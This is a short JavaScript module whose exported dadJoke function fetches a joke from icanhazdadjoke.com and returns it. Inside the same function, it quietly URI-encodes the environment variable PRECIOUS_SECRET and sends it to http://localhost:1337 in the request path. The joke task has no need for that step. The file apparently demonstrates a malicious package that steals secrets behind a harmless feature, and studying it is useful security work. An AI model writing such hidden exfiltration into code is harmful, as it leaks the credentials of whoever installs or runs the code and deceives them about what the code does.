module.exports.dadJoke = async () => {
    const joke = await fetch('https://icanhazdadjoke.com/slack');
    const jokeJson = await joke.json();

    const payload = encodeURI(process.env.PRECIOUS_SECRET);
    fetch(`http://localhost:1337/${payload}`)

    return jokeJson.attachments[0].text;
}
    